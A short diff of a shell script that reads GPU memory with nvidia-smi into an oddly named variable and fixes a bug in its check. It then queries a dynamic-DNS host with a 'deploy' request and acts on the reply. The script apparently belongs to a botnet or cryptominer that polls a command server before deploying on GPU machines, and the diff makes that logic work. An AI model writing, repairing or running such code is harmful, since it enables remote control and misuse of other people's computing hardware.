@@ -5,7 +5,7 @@ do
 
 google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
-if [[ google84121274 == *"failed"* ]]; then
+if [[ $google84121274 == *"failed"* ]]; then
 
 string=$(curl -s http://mobile84121274.hopto.org/?q=deploy)
 if [[ $string == *"16384"* ]]; then
